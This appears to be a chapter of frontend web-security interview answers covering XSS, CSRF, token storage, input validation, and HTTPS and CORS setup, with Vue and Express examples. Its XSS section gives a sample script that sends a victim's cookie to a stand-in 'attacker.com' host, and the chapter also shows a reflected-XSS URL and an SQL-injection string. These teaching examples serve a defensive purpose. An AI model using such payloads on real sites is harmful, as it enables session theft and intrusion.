# Security

Web security best practices for frontend applications.

---

## Table of Contents

1. [XSS Prevention](#101-xss-prevention)

2. [CSRF Protection](#102-csrf-protection)

3. [Authentication Best Practices](#103-authentication-best-practices)

4. [Input Validation & Sanitization](#104-input-validation--sanitization)

5. [HTTPS & CORS](#105-https--cors)

---

## 10. Security

### 10.1. XSS Prevention

**Senior-level Answer:**

XSS (Cross-Site Scripting) is injecting malicious scripts into web pages.

#### **Types of XSS**

**1. Stored XSS** - Malicious script saved on server

```html
<!-- Attacker submits comment: -->
<script>
  document.location = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**2. Reflected XSS** - Script in URL parameters

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS** - Script modifies DOM

```js
// Vulnerable code
document.getElementById("output").innerHTML = location.hash.substring(1);
```

#### **Vue 3 Built-in Protection**

```vue
<template>
  <!-- ✅ SAFE: Vue auto-escapes text interpolation -->
  <div>{{ userInput }}</div>
  <!-- If userInput = "<script>alert('xss')</script>" -->
  <!-- Renders as: &lt;script&gt;alert('xss')&lt;/script&gt; -->

  <!-- ❌ DANGEROUS: v-html renders raw HTML -->
  <div v-html="userInput"></div>
  <!-- Script will execute! -->

  <!-- ✅ SAFE: Attribute binding -->
  <div :title="userInput">Hover</div>
  <!-- Vue escapes attributes -->
</template>
```

#### **Sanitize HTML**

```ts
import DOMPurify from "dompurify";

const cleanHTML = DOMPurify.sanitize(dirtyHTML);
```

```vue
<template>
  <div v-html="sanitizedHTML"></div>
</template>

<script setup>
import { computed } from "vue";
import DOMPurify from "dompurify";

const props = defineProps<{ html: string }>();
const sanitizedHTML = computed(() => DOMPurify.sanitize(props.html));
</script>
```

#### **Content Security Policy (CSP)**

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
/>
```

#### **Best Practices**

```ts
// ✅ Validate input
function validateEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// ✅ Escape output
function escapeHTML(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ✅ Use textContent instead of innerHTML
element.textContent = userInput; // Safe
element.innerHTML = userInput; // Dangerous

// ❌ Avoid eval()
eval(userInput); // NEVER do this
```

---

### 10.2. CSRF Protection

**Senior-level Answer:**

CSRF (Cross-Site Request Forgery) tricks users into executing unwanted actions.

#### **CSRF Token Pattern**

```ts
// Backend creates token
const csrfToken = crypto.randomBytes(32).toString("hex");
res.cookie("XSRF-TOKEN", csrfToken);

// Frontend includes token in requests
axios.defaults.headers.common["X-XSRF-TOKEN"] = getCookie("XSRF-TOKEN");

// Backend validates token
if (req.headers["x-xsrf-token"] !== req.cookies["XSRF-TOKEN"]) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

#### **Axios Auto CSRF**

```ts
import axios from "axios";

axios.defaults.xsrfCookieName = "XSRF-TOKEN";
axios.defaults.xsrfHeaderName = "X-XSRF-TOKEN";
```

#### **SameSite Cookies**

```js
// Server sets cookie with SameSite attribute
res.cookie("sessionId", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // or 'lax' or 'none'
});

// SameSite=Strict: Cookie only sent for same-site requests
// SameSite=Lax: Cookie sent for top-level navigation
// SameSite=None: Cookie sent cross-site (requires Secure)
```

---

### 10.3. Authentication Best Practices

**Senior-level Answer:**

#### **JWT Storage**

```ts
// ❌ BAD: localStorage (vulnerable to XSS)
localStorage.setItem("token", jwt);

// ✅ GOOD: httpOnly cookie (JavaScript can't access)
// Server sets:
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000,
});

// ✅ ALTERNATIVE: Memory + Refresh Token pattern
let accessToken = null; // In memory, lost on refresh

// Store refresh token in httpOnly cookie
// Use refresh token to get new access token
```

#### **Refresh Token Flow**

```ts
// 1. Login: Receive access + refresh tokens
const login = async (email, password) => {
  const { accessToken, refreshToken } = await api.post("/auth/login", {
    email,
    password,
  });

  // Store access token in memory
  setAccessToken(accessToken);

  return true;
};

// 2. API call with access token
axios.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 3. Handle 401: Refresh token
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        const { accessToken } = await api.post("/auth/refresh");
        setAccessToken(accessToken);

        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        router.push("/login");
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

---

### 10.4. Input Validation & Sanitization

**Senior-level Answer:**

#### **Frontend Validation**

```ts
import { z } from "zod";

// Define schema
const userSchema = z.object({
  email: z.string().email("Invalid email"),
  password: z.string().min(8, "Password must be at least 8 characters"),
  age: z.number().min(18, "Must be 18+").max(120),
});

// Validate
try {
  const user = userSchema.parse(formData);
} catch (error) {
  if (error instanceof z.ZodError) {
    console.log(error.errors);
  }
}
```

#### **Backend Validation (Never trust frontend)**

```ts
// Express + Zod
import { z } from "zod";

const createUserSchema = z.object({
  body: z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
  }),
});

app.post("/users", validate(createUserSchema), async (req, res) => {
  // req.body is validated
});
```

#### **SQL Injection Prevention**

```ts
// ❌ NEVER concatenate SQL queries
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker input: ' OR '1'='1

// ✅ Use parameterized queries
const query = "SELECT * FROM users WHERE email = ?";
db.execute(query, [email]);

// ✅ Or use ORM
const user = await User.findOne({ where: { email } });
```

---

### 10.5. HTTPS & CORS

**Senior-level Answer:**

#### **HTTPS**

```ts
// Always use HTTPS in production
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https") {
    return res.redirect(`https://${req.header("host")}${req.url}`);
  }
  next();
});

// Set Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader(
    "Strict-Transport-Security",
    "max-age=31536000; includeSubDomains"
  );
  next();
});
```

#### **CORS Configuration**

```ts
// ❌ BAD: Allow all origins
app.use(
  cors({
    origin: "*",
  })
);

// ✅ GOOD: Whitelist specific origins
const allowedOrigins = ["https://myapp.com", "https://admin.myapp.com"];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true, // Allow cookies
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);
```

---

[← Back to Overview](../../README-en.md)

